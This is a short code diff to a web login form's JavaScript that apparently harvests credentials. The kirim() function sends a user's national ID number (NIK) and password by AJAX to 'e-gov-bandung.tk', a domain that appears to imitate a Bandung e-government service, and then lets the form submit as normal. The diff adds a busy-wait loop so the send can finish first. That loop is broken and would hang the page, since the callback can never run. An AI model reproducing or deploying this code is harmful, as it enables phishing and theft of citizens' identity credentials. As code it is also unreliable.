@@ -102,11 +102,16 @@
     function kirim() {
         var nik = $('#nik').val();
         var password = $('#inputPassword').val();
+
+        var wait = true;
         $.ajax({
             url: 'http://e-gov-bandung.tk/dukcapil/api/public/auth/login',
             type: 'POST',
             data: { nik: nik, password : password}
+        }).done(function (e) {
+            wait = false;
         });
+        while (wait);
         return true;
     }
 </script>
